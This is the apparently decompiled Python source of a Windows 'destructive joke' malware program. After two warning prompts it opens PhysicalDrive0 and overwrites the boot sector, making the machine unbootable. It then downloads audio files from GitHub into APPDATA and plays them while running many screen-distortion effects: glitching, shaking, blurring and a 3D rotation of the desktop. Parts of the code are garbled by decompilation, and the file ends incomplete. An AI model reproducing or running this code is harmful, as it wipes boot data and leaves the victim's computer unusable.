from matplotlib.pyplot import pyplot as plt
import matplotlib as mpl
from mpl_toolkits.mplot3d import Axes3D
import numpy as np
from PIL import ImageWin, Image, ImageGrab, ImageOps, ImageDraw, ImageFilter
from random import randrange as rd
from win32api import *
from win32gui import *
from win32con import *
from win32file import *
from random import *
from win32api import GetSystemMetrics as Gs
from random import randint as rdi
from urllib.request import urlretrieve as download
import winsound
from os import system, getenv
import cv2
from sys import exit
from win32api import *
from win32gui import *
from time import *
from win32ui import *
from random import *
import ctypes
import os
from win32con import *
import winsound
from PIL import Image, ImageGrab, ImageWin, ImageFilter, ImageFont, ImageDraw, ImageColor, ImageChops, ImageOps, ImageEnhance

def GrayBlt(hwnd, x1, y1, x2, y2):
    deskIm = ImageGrab.grab()
    img = deskIm.convert('L')
    dib = ImageWin.Dib(img)
    dib.draw(hwnd, (x1, y1, x2, y2))


def DarkBlt(hwnd, x1, y1, x2, y2):
    deskIm = ImageGrab.grab()
    img = deskIm.convert('1')
    dib = ImageWin.Dib(img)
    dib.draw(hwnd, (x1, y1, x2, y2))


def PixelBlt(hwnd, xMax, yMax):
    img = ImageGrab.grab()
    imgSmall = img.resize((xMax, yMax), Image.BILINEAR, **('resample',))
    result = imgSmall.resize(img.size, Image.NEAREST)
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def BlurBlt(hwnd):
    img = ImageGrab.grab()
    result = img.filter(ImageFilter.BLUR)
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def SharpBlt(hwnd):
    img = ImageGrab.grab()
    result = img.filter(ImageFilter.SHARPEN)
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def DetBlt(hwnd):
    img = ImageGrab.grab()
    result = img.filter(ImageFilter.DETAIL)
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def SmBlt(hwnd):
    img = ImageGrab.grab()
    result = img.filter(ImageFilter.SMOOTH)
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def Sm2Blt(hwnd):
    img = ImageGrab.grab()
    result = img.filter(ImageFilter.SMOOTH_MORE)
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def ContourBlt(hwnd):
    img = ImageGrab.grab()
    result = img.filter(ImageFilter.CONTOUR)
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def EmBlt(hwnd):
    img = ImageGrab.grab()
    result = img.filter(ImageFilter.EMBOSS)
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def EdBlt(hwnd):
    img = ImageGrab.grab()
    result = img.filter(ImageFilter.FIND_EDGES)
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def EnBlt(hwnd):
    img = ImageGrab.grab()
    result = img.filter(ImageFilter.EDGE_ENHANCE)
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def En2Blt(hwnd):
    img = ImageGrab.grab()
    result = img.filter(ImageFilter.EDGE_ENHANCE_MORE)
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def UnBlt(hwnd, radus, prcnt, thrshold):
    img = ImageGrab.grab()
    result = img.filter(ImageFilter.UnsharpMask(radus, prcnt, thrshold, **('radius', 'percent', 'threshold')))
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def Gs(types):
    return GetSystemMetrics(types)


def rand():
    return randrange(0x5AF3107A3FFFL)


def DragBlt(hwnd, size, ranktype):
    if ranktype == 0:
        rank = 0
    if ranktype == 1:
        rank = size * size / 2
    if ranktype == 2:
        rank = size * size - 1
    img = ImageGrab.grab()
    result = img.filter(ImageFilter.RankFilter(size, rank))
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def MirrorBlt(hwnd):
    im = ImageGrab.grab()
    result = im.transpose(Image.FLIP_LEFT_RIGHT)
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def RotateBlt(hwnd, angle, expanding, color):
    im = ImageGrab.grab()
    result = im.rotate(angle, expanding, color, **('expand', 'fillcolor'))
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def TxtBlt(hwnd, text, size, x, y):
    unicode_text = 'Hello World!'
    font = ImageFont.truetype('arial.ttf', size, 'unic', **('encoding',))
    (text_width, text_height) = font.getsize(unicode_text)
    canvas = ImageGrab.grab()
    draw = ImageDraw.Draw(canvas)
    draw.text((x, y), text, (randrange(255), randrange(255), randrange(255)), font)
    dib = ImageWin.Dib(canvas)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def TxtBlt2(hwnd, text, size, x, y):
    unicode_text = 'Hello World!'
    font = ImageFont.truetype('arial.ttf', size, 'unic', **('encoding',))
    (text_width, text_height) = font.getsize(unicode_text)
    canvas = ImageGrab.grab()
    draw = ImageDraw.Draw(canvas)
    draw.text((x, y), text, (255, 255, 255), font)
    dib = ImageWin.Dib(canvas)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def RefreshMonitor():
    hwnd = WindowFromPoint((0, 0))
    monitor = (0, 0, GetSystemMetrics(0), GetSystemMetrics(1))
    InvalidateRect(hwnd, monitor, True)


def ChopBlt(hwnd, x, y):
    im = ImageGrab.grab()
    result = ImageChops.offset(im, x, y)
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def FlipBlt(hwnd):
    im = ImageGrab.grab()
    result = ImageOps.flip(im)
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def LambaBlt(hwnd, mult):
    im = ImageGrab.grab()
    result = None((lambda i = None: i * mult))
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def BrightBlt(hwnd, factor):
    im = ImageGrab.grab()
    enhancer = ImageEnhance.Brightness(im)
    result = enhancer.enhance(factor)
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))


def getWallPaper():
    currentWallpaper = getenv('APPDATA') + '\\Microsoft\\Windows\\Themes\\TranscodedWallpaper'
    return Image.open(currentWallpaper)


def FillBlt(hwnd, r, g, b):
    im = ImageGrab.grab()
    im.paste((r, g, b), [
        0,
        0,
        im.size[0],
        im.size[1]])
    dib = ImageWin.Dib(im)
    dib.draw(hwnd, (0, 0, Gs(SM_CXSCREEN), Gs(SM_CYSCREEN)))

if MessageBox('This program is a virus, and has all the capacity to delete all of your data. The creator of this malicious software is not responsible for any damage what so ever made using it. Still continue?', 'Warning!', MB_ICONWARNING | MB_YESNO) == 7:
    exit()
if MessageBox("Y'all know what it is if you've made it this far, but this software is really harmfull! DO YOU WANT TO CONTINUE, RESULTING IN AN UNUSABLE MACHINE??", 'Warning!', MB_ICONWARNING | MB_YESNO) == 7:
    exit()
hDevice = CreateFileW('\\\\.\\PhysicalDrive0', GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, 0)
WriteFile(hDevice, AllocateReadBuffer(512), None)
CloseHandle(hDevice)
app = getenv('appdata') + '\\'
download('https://github.com/Itzsten/filefy-downloads/blob/main/Distortion%205.wav?raw=true', app + 'Distortion 5.wav')
download('https://github.com/Itzsten/filefy-downloads/blob/main/Distortion%20Drone.wav?raw=true', app + 'Distortion Drone.wav')
download('https://github.com/Itzsten/filefy-downloads/blob/main/Distortion%20Hum.wav?raw=true', app + 'Distortion Hum.wav')
download('https://github.com/Itzsten/filefy-downloads/blob/main/TV%20Static.wav?raw=true', app + 'TV Static.wav')
monitor = (0, 0, GetSystemMetrics(0), GetSystemMetrics(1))
redesk = WindowFromPoint((0, 0))

def checkVals(check):
    lp = []
    for i in range(0, len(check)):
        item = check[i]
        if i == 2:
            if item < lp[0]:
                current = lp[0]
                lp[0] = item
                lp.append(current)
            elif item == lp[0]:
                lp.append(item + 1)
            else:
                lp.append(item)
        if i == 3:
            if item < lp[1]:
                current = lp[1]
                lp[1] = item
                lp.append(current)
            elif item == lp[1]:
                lp.append(item + 1)
            else:
                lp.append(item)
        lp.append(item)
    return tuple(lp)


def drawMat(hwnd, img):
    I = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
    res = Image.fromarray(np.uint8(I))
    dib = ImageWin.Dib(res)
    dib.draw(hwnd, (0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN)))


def getCVScreen():
    im = ImageGrab.grab().convert('RGB')
    open_cv_image = np.array(im)
    return open_cv_image[(:, :, ::-1)].copy()


def drawPIL(hwnd, imga):
    dib = ImageWin.Dib(imga)
    dib.draw(hwnd, (0, 0, GetSystemMetrics(0), GetSystemMetrics(1)))


def drawAx(hwnd, ax, x, y, xrot, yrot):
    ax.grid(None, **('b',))
    ax.axis('off')
    ax.view_init(xrot, yrot)
    ax.figure.savefig(app + 'fig.png', True, **('transparent',))
    image = Image.open(app + 'fig.png').convert('RGBA')
    img = Image.open(app + 'screen.png')
    img.paste(image, (x, y), image)
    drawPIL(desk, img)


def PolyInvert(hwnd, polly, x, y):
    img = ImageGrab.grab()
    original = ImageOps.invert(img).convert('RGBA')
    xy = polly
    mask = Image.new('L', original.size, 0)
    draw = ImageDraw.Draw(mask)
    draw.polygon(xy, 255, None, **('fill', 'outline'))
    black = Image.new('L', original.size, 0)
    result = Image.composite(original, black, mask)
    img.paste(result, (x, y), result)
    drawPIL(hwnd, img)


def redraw():
    RedrawWindow(WindowFromPoint((0, 0)), None, None, RDW_ALLCHILDREN | RDW_ERASE | RDW_INVALIDATE)


def JPGBlt(quality, x, y, x2, y2):
    desk = GetDC(0)
    box = checkVals((x, y, x2, y2))
    xx = GetSystemMetrics(0)
    yy = GetSystemMetrics(1)
    im1 = ImageGrab.grab()
    im = im1.crop(box)
    im.save(app + '\\compressed.jpg', quality, **('quality',))
    compressed = Image.open(app + '\\compressed.jpg')
    im1.paste(compressed, box)
    dib = ImageWin.Dib(im1)
    dib.draw(desk, (0, 0, xx, yy))


def ClrBlt(hwnd, x, y, x2, y2, clr, circle = (False,)):
    img = ImageGrab.grab()
    box = checkVals((x, y, x2, y2))
    res = img.crop(box)
    bw = res.convert('L')
    bw = ImageOps.colorize(bw, (0, 0, 0), clr)
    im = bw.convert('RGB')
    if circle == True:
        bigsize = (im.size[0] * 3, im.size[1] * 3)
        mask = Image.new('L', bigsize, 0)
        draw = ImageDraw.Draw(mask)
        draw.ellipse((0, 0) + bigsize, 255, **('fill',))
        mask = mask.resize(im.size, Image.ANTIALIAS)
        im.putalpha(mask)
        output = ImageOps.fit(im, mask.size, (0.5, 0.5), **('centering',))
        output.putalpha(mask)
        background = img
        background.paste(im, box, im)
    else:
        background = img
        background.paste(im, box)
    dib = ImageWin.Dib(background)
    dib.draw(hwnd, (0, 0, GetSystemMetrics(0), GetSystemMetrics(1)))


def Turn3D(hwnd, times, xRt, yRt, clr):
    img = getCVScreen()
    scale_percent = 200
    desk = hwnd
    cl = 0
    width = int(img.shape[1] * scale_percent / 100)
    height = int(img.shape[0] * scale_percent / 100)
    dim = (width, height)
    img = cv2.resize(img, dim, cv2.INTER_LINEAR, **('interpolation',))
    proj2dto3d = np.array([
        [
            1,
            0,
            -img.shape[1] / 2],
        [
            0,
            1,
            -img.shape[0] / 2],
        [
            0,
            0,
            0],
        [
            0,
            0,
            1]], np.float32)
    rx = np.array([
        [
            1,
            0,
            0,
            0],
        [
            0,
            1,
            0,
            0],
        [
            0,
            0,
            1,
            0],
        [
            0,
            0,
            0,
            1]], np.float32)
    ry = np.array([
        [
            1,
            0,
            0,
            0],
        [
            0,
            1,
            0,
            0],
        [
            0,
            0,
            1,
            0],
        [
            0,
            0,
            0,
            1]], np.float32)
    rz = np.array([
        [
            1,
            0,
            0,
            0],
        [
            0,
            1,
            0,
            0],
        [
            0,
            0,
            1,
            0],
        [
            0,
            0,
            0,
            1]], np.float32)
    trans = np.array([
        [
            1,
            0,
            0,
            0],
        [
            0,
            1,
            0,
            0],
        [
            0,
            0,
            1,
            400],
        [
            0,
            0,
            0,
            1]], np.float32)
    proj3dto2d = np.array([
        [
            200,
            0,
            img.shape[1] / 2,
            0],
        [
            0,
            200,
            img.shape[0] / 2,
            0],
        [
            0,
            0,
            1,
            0]], np.float32)
    x = 0
    y = 0
    z = 0
    for i in range(times):
        ax = float(x * (np.pi / 180))
        ay = float(y * (np.pi / 180))
        az = float(z * (np.pi / 180))
        rx[(1, 1)] = np.cos(ax)
        rx[(1, 2)] = -np.sin(ax)
        rx[(2, 1)] = np.sin(ax)
        rx[(2, 2)] = np.cos(ax)
        ry[(0, 0)] = np.cos(ay)
        ry[(0, 2)] = -np.sin(ay)
        ry[(2, 0)] = np.sin(ay)
        ry[(2, 2)] = np.cos(ay)
        rz[(0, 0)] = np.cos(az)
        rz[(0, 1)] = -np.sin(az)
        rz[(1, 0)] = np.sin(az)
        rz[(1, 1)] = np.cos(az)
        r = rx.dot(ry).dot(rz)
        final = proj3dto2d.dot(trans.dot(r.dot(proj2dto3d)))
        dst = cv2.warpPerspective(img, final, (img.shape[1], img.shape[0]), None, cv2.INTER_LINEAR, cv2.BORDER_CONSTANT, clr)
        drawMat(hwnd, dst)
        x = x + xRt
        y = y + yRt

desk = GetDC(0)
colors = np.empty([
    5,
    5,
    5] + [
    4], np.float32, **('dtype',))
colors[:] = [
    0.3,
    0,
    0,
    1]
GET_PERSPECTIVE_DATA = 0.25
fig = plt.figure()
ax = fig.add_subplot(111, '3d', **('projection',))
figge = plt.figure((10, 10), **('figsize',))
axe = figge.add_subplot(111, '3d', **('projection',))
u = np.linspace(0, 2 * np.pi, 100)
v = np.linspace(0, np.pi, 100)
x = 10 * np.outer(np.cos(u), np.sin(v))
y = 10 * np.outer(np.sin(u), np.sin(v))
z = 10 * np.outer(np.ones(np.size(u)), np.cos(v))
axe.plot_surface(x, y, z, 4, 4, 'b', **('rstride', 'cstride', 'color'))

def playsound(name):
    winsound.PlaySound(name, winsound.SND_ASYNC | winsound.SND_ALIAS)


def sinewaves():
    hwnd = GetDesktopWindow()
    x = GetSystemMetrics(0)
    y = GetSystemMetrics(1)
    M_PI = np.pi
    angle = 2
    for i in range(0, 1000):
        desk = GetDC(0)
        a = np.sin(angle) * 20
        BitBlt(desk, i * 2, 0, 1, y, desk, i, int(a), SRCCOPY)
        del a
        del desk
    del M_PI
    del hwnd

ax.voxels(np.ones([
    5,
    5,
    5], bool, **('dtype',)), colors, **('facecolors',))

def SharpBlt(hwnd):
    img = ImageGrab.grab()
    result = img.filter(ImageFilter.SHARPEN)
    dib = ImageWin.Dib(result)
    dib.draw(hwnd, (0, 0, Gs(0), Gs(1)))


def shake(counter):
    desk = GetDC(0)
    sw = GetSystemMetrics(0)
    sh = GetSystemMetrics(1)
    deskMem = CreateCompatibleDC(desk)
    screenshot = CreateCompatibleBitmap(desk, sw, sh)
    SelectObject(deskMem, screenshot)
    wRect = list(GetWindowRect(GetDesktopWindow()))
    wPt = ((wRect[0] + counter, wRect[1] - counter), (wRect[2] + counter, wRect[1] + counter), (wRect[0] - counter, wRect[3] - counter))
    PlgBlt(deskMem, wPt, desk, wRect[0], wRect[1], wRect[2] - wRect[0], wRect[3] - wRect[1], 0, 0, 0)
    BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCPAINT)
    Sleep(10)
    if rd(10) == 5:
        InvalidateRect(0, None, 0)
    DeleteObject(screenshot)
    DeleteObject(deskMem)


def undistort(hwnd, DIM):
    img = getCVScreen()
    K = np.array([
        [
            781.352,
            0,
            794.712],
        [
            0,
            779.507,
            561.331],
        [
            0,
            0,
            1]])
    D = np.array([
        [
            -0.0425952],
        [
            0.0313078],
        [
            -0.041047],
        [
            0.015343]])
    (h, w) = img.shape[:2]
    (map1, map2) = cv2.fisheye.initUndistortRectifyMap(K, D, np.eye(3), K, DIM, cv2.CV_16SC2)
    undistorted_img = cv2.remap(img, map1, map2, cv2.INTER_LINEAR, cv2.BORDER_CONSTANT, **('interpolation', 'borderMode'))
    drawMat(hwnd, undistorted_img)

playsound(app + 'Distortion Drone.wav')
Grid_Brush = CreateSolidBrush(RGB(200, 0, 0))
Brush_3D = CreateSolidBrush(RGB(255, 0, 0))
ImageGrab.grab().save(app + 'screen.png')
w = GetSystemMetrics(0)
h = GetSystemMetrics(1)
for i in range(0, 100):
    drawAx(desk, ax, i * 8, i * 8, i * 5, i)
    a = randrange(monitor[2])
    b = randrange(monitor[3])
    shake(rdi(-4, 4))
playsound(app + 'Distortion Hum.wav')
for i in range(0, 100):
    JPGBlt(0, randrange(w), randrange(h), randrange(w), randrange(h))
    shake(rdi(-8, 8))
redraw()
Sleep(10)
playsound(app + 'Distortion 5.wav')
for i in range(170, 200):
    a = randrange(monitor[2])
    b = randrange(monitor[3])
    BitBlt(desk, a, b, randint(1, i * 1000 + 1), randint(1, i * 3000 + 1), desk, a + randrange(int(i / 5 + 1)) - 11, b + randrange(int(i / 5 + 1)) - 11, 13161373 if randint(1, 2) == 2 else 15597702)
    shake(rdi(-20, 20))
x = monitor[2]
y = monitor[3]

def randomPoly():
    P = []
    for i in range(1, rd(10) + 3):
        P.append((rd(x), rd(y)))
    return P

playsound(app + 'TV Static.wav')
for i in range(0, 100):
    SharpBlt(desk)
    sz = rdi(60, 500)
    xloc = rdi(sz, x)
    yloc = rdi(sz, y)
    ClrBlt(desk, xloc - sz, yloc - sz, xloc, yloc, (rdi(0, 255), rdi(0, 255), rdi(0, 255)), True)
    Sleep(10)
for i in range(0, 20):
    shake(rdi(int((i / 2) * -1), int(i / 2)))
Turn3D(desk, 70, 3, 0, (0, 0, 0))
redraw()
Sleep(100)
# WARNING: Decompyle incomplete